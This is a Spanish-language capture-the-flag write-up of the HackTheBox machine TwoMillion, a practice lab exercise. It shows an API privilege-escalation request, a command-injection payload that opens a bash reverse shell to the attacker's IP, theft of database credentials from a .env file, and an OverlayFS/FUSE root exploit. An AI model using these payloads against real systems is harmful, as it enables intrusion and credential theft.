---
title: TwoMillion
layout: default
parent: HackTheBox
---

# TwoMillion
{:.no_toc}

---

1. List
{:toc}

---
## Reconocimiento

Primero comprobaremos si tenemos conexión con la máquina con un ping, una vez esto veremos que puertos tiene abiertos.

```shell
ping -c 1 10.10.11.221
```

```shell
nmap -p- -sS --open --min-rate 5000 10.10.11.221 -n -Pn -oG allPorts
```

Vemos que hay dos puertos abiertos, el 22 y el 80. En mi caso con la utilidad extractPorts recojo los puertos detectados abiertos para copiarlos.

![](/assets/images/Imagenes/Pasted image 20240921130911.png)

Una vez comprobados cuáles están abiertos podemos comprobar su versión.

```shell
nmap -sCV -p22,80 10.10.11.221 -oN targeted
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 13:10 CEST
Nmap scan report for 10.10.11.221
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
```

Vemos que la máquina corre linux. Si intentamos acceder al servicio web de esta vemos que intenta resolver con el dominio 2million.htb, por lo que tendremos que añadir la dirección al archivo /etc/hosts.

![](/assets/images/Imagenes/Pasted image 20240921131442.png)

Vemos que hay varios enlaces que nos llevan por la página principal, además de una página en la que nos pide un código de invitación.

![](/assets/images/Imagenes/Pasted image 20240921131903.png)

Además de una página de login.


![](/assets/images/Imagenes/Pasted image 20240921131934.png)


No podemos ni enviar un código ni con credenciales comunes a ambas páginas. Por lo que podemos probar con ver si hay más directorios a los que podamos acceder.

```shell
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sh 162 http://2million.htb/ --sw
```

Sin embargo no hay nada interesante. SI volvemos a la página de invitación e inspeccionamos buscando alguna función vemos que existe **makeInviteCode()**.

![](/assets/images/Imagenes/Pasted image 20240923125308.png)

Vemos que pone que los datos están encriptados, y el tipo de encriptado es ROT13, que se basa en dado un texto definido cada letra se mueve 13 posiciones hacia delante en el abecedario, por lo que si buscamos una página para desencriptarlo deberemos ver el contenido original. En mi caso he utilizado [rot13.com](https://rot13.com/). 

![](/assets/images/Imagenes/Pasted image 20240923125548.png)

Vemos entonces que para generar un código de invitación debemos hacer una petición mediante POST al directorio **/api/v1/invite/generate**. Para ello podemos usar curl.

```shell
curl -s -X POST 'http://2million.htb/api/v1/invite/generate' | jq
```

![](/assets/images/Imagenes/Pasted image 20240923132310.png)

Vemos que nos genera un código, pero si nos fijamos en como acaba, vemos que es un '=', por lo que es posible que sea en base64. Para descifrar el contenido podemos usar echo con la función base64.

```shell
echo 'SlA3SFEtWkhXUUktNkdFUkUtWEgyTlg=' | base64 -d; echo
JP7HQ-ZHWQI-6GERE-XH2NX
```

![](/assets/images/Imagenes/Pasted image 20240923130352.png)

Si probamos el código en la página veremos que ahora nos deja registrarnos.

![](/assets/images/Imagenes/Pasted image 20240923130448.png)

Si nos registramos podemos logearnos dentro de la página de la máquina.

![](/assets/images/Imagenes/Pasted image 20240923130709.png)

Si investigamos por la página vemos que no podemos acceder a mucho, pero lo más interesante en que podemos acceder a el apartado de acceso, donde podemos generar y regenerar un archivo de acceso por vpn. 

Si pasamos por encima de la opción de regenerar vemos cuál es la ruta para generarlo de la aplicación, por lo que podemos probar a ver que más opciones tiene la api para ver si hay algo interesante. Esto podremos hacerlo con curl. 

Si intentamos hacer la petición es posible que no aparezca nada, por lo que tendremos que especificar que nos de información a medida que hace la petición.

![](/assets/images/Imagenes/Pasted image 20240923133304.png)

No podremos ver el contenido ya que necesitamos nuestra cookie de sesión para que la petición tenga validez de un usuario existente y activo. Para ello deberemos inspeccionar dentro de la página ya logeados en el apartado aplicación y coopiar su contenido.

![](/assets/images/Imagenes/Pasted image 20240923133447.png)

Después en la petición con curl deberemos añadir un encabezado con nuestra cookie de sesión.

```shell
curl -s -X GET 'http://2million.htb/api/v1' -H 'Cookie: PHPSESSID=6kn6f96bdiunm63k8pb38i8rga'  | jq
```

Con esto nos dará las rutas de funciones que tiene la api.

```js
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Vemos varias opciones interesantes, como ver si somos usuario admin o generar una vpn para un usuario, sin embargo no podremos acceder al no tener permiso. Pero vemos que también está la opción de actualizar la configuración de usuario, por lo que podemos intentar hacer una petición esta vez mediante PUT.

```shell
curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=6kn6f96bdiunm63k8pb38i8rga' | jq
```

![](/assets/images/Imagenes/Pasted image 20240923134539.png)

No podremos ver el contenido, ya que al trabajar con api's deberemos indicar que el contenido es json.

![](/assets/images/Imagenes/Pasted image 20240923134804.png)

Si lo indicamos veremos que nos falta añadir un email válido, por lo que añadiremos con el que nos hemos registrado en la página. Esta información debe ser pasada en formato json.

![](/assets/images/Imagenes/Pasted image 20240923135010.png)

Ahora vemos que falta el parámetro "is_admin" en la petición, por lo que deberemos añadirlo a los datos que hemos introducido.

![](/assets/images/Imagenes/Pasted image 20240923135221.png)

Vemos que no debería ser True si no 1 para cambiar la configuración.

```shell
curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=6kn6f96bdiunm63k8pb38i8rga' -H 'Content-Type: application/json' -d '{"email": "adri@gmail.com","is_admin": 1}'| jq
{
  "id": 13,
  "username": "adri",
  "is_admin": 1
}

```

![](/assets/images/Imagenes/Pasted image 20240923135305.png)

Y ahora veremos que en el apartado de información de "is_admin" ahora es verdadero, por lo que podremos chequear si ahora nuestro usuario tiene permisos de administrador con la anterior ruta de la api "/api/v1/admin/auth".

![](/assets/images/Imagenes/Pasted image 20240923135508.png)

Con esto confirmamos que ya tenemos permisos de adminsitrador.

Anteriormente no podíamos generar una VPN para un usuario, por lo que ahora es posible que si podamos. 

![](/assets/images/Imagenes/Pasted image 20240923140754.png)

Ahora vemos que el mensaje no es de acceso no autorizado, si no de indicar el usuario, por lo que igual que anteriormente indicaremos que usuario somos.

![](/assets/images/Imagenes/Pasted image 20240923141205.png)

Vemos que ahora la respuesta no está en json, por que quitaremos ese tipo de output.

```shell
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=6kn6f96bdiunm63k8pb38i8rga' -H 'Content-Type: application/json' -d '{"username":"adri"}'
```

![](/assets/images/Imagenes/Pasted image 20240923141301.png)

Y con esto nos habría generado unas credenciales de conexión por vpn. 

## Explotación

Sin embargo, no está claro de que forma se genera este archivo, ya que si probamos a hacerlo con otro usuario inventado también se crea, es decir, no se asegura de que este existe y tan solo se genera en base al contenido de usuario.

Con esto posible que podamos inyectar código en ese parámetro, de modo que al intentar generar un nuevo archivo de conexión se ejecute el comando de creación de la vpn con un parámetro que introduzcamos en ese campo.

Si probamos con un nombre de usuario, cortado por **;**, para indicar el siguiente comando, y  **whoami;** veremos que no sucede nada, ya que es posible que haya más parámetro después del usuario, por lo que para anular estos pondremos **#**, de modo que se conviertan en comentario y no se ejecuten.

![](/assets/images/Imagenes/Pasted image 20240923142214.png)

Vemos que efectivamente se ejecuta y nos da el nombre de usuario, por lo que a través de esto podemos realizar una reverse shell a través de bash.

```shell
bash -c "bash -i  >& /dev/tcp/10.10.15.32/443 0>&1\";"
```

Antes de ejecutar el comando nos pondremos en escucha con netcat por el puerto que hayamos indicado, en este caso 443, y ejecutaremos el comando.

```shell
nc -lvnp 443
```

```shell
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H 'Cookie: PHPSESSID=6kn6f96bdiunm63k8pb38i8rga' -H 'Content-Type: application/json' -d '{"username":"test; bash -c \"bash -i >& /dev/tcp/10.10.15.32/443 0>&1\";"}'
```

Con esto estaremos dentro de la máquina.

![](/assets/images/Imagenes/Pasted image 20240923143218.png)

Para estabilizar la shell utilizaré la siguiente serie de comandos.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
ENTER
```

Si mostramos que archivos hay dentro del directorio veremos que existe **Database.php**, el cual accede a las credenciales de la base de datos de usuarios, pero que no cuenta con ninguna de ellas. Pero vemos que accede a variables de entorno, por lo que si buscamos archivos ocultos veremos que existe **.env**, que nos muestra cuáles son.

![](/assets/images/Imagenes/Pasted image 20240923143827.png)

```shell
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Si probamos a entrar con estas credenciales a la máquina veremos que accedemos como el usuario admin.

![](/assets/images/Imagenes/Pasted image 20240923144017.png)

Veremos que la flag de usuario estará es su directorio. Además al acceder vemos que tenemos correo, por lo que podemos echar un vistazo, estos se encuentran en **/var/mail**.

## Escalada de privilegios

Si accedemos al directorio veremos que hay un correo de un usuario llamado ch4p.

![](/assets/images/Imagenes/Pasted image 20240923144645.png)

Este nos comenta que si podemos actualizar la versión del sistema, ya que parece ser que se han encontrado varias vulnerabilidades este año, en concreto de OverlayFS / FUSE. Por lo que echaremos un vistazo por si ex posible explotarla.

![](/assets/images/Imagenes/Pasted image 20240923145615.png)

Vemos que es vulnerable sistemas Ubuntu 22.04, por lo que si echamos un vistazo a la versión de la máquina veremos que se corresponde.

![](/assets/images/Imagenes/Pasted image 20240923145750.png)

Por lo que nos descargaremos el repositorio, lo comprimiremos para que sea más fácil enviarlo a la máquina víctima, y una vez allí seguiremos las instrucciones del exploit.

![](/assets/images/Imagenes/Pasted image 20240923150115.png)

Para pasarlo iniciaré un servidor con python y con la máquina víctima una petición del recurso.

![](/assets/images/Imagenes/Pasted image 20240923150333.png)

Deberemos abrir dos terminales de la misma máquina, una donde descomprimiremos el exploit, entraremos en el, ejecutaremos el comando make all, además de el comando
**./fuse ./ovlcap/lower ./gc**, y en otra terminal, con las credenciales de admin, accederemos al mismo directorio y usaremos el comando **./exp**, con lo que conseguiremos ser usuario root, con su respectiva flag en su directorio.


![](/assets/images/Imagenes/Pasted image 20240923150735.png)
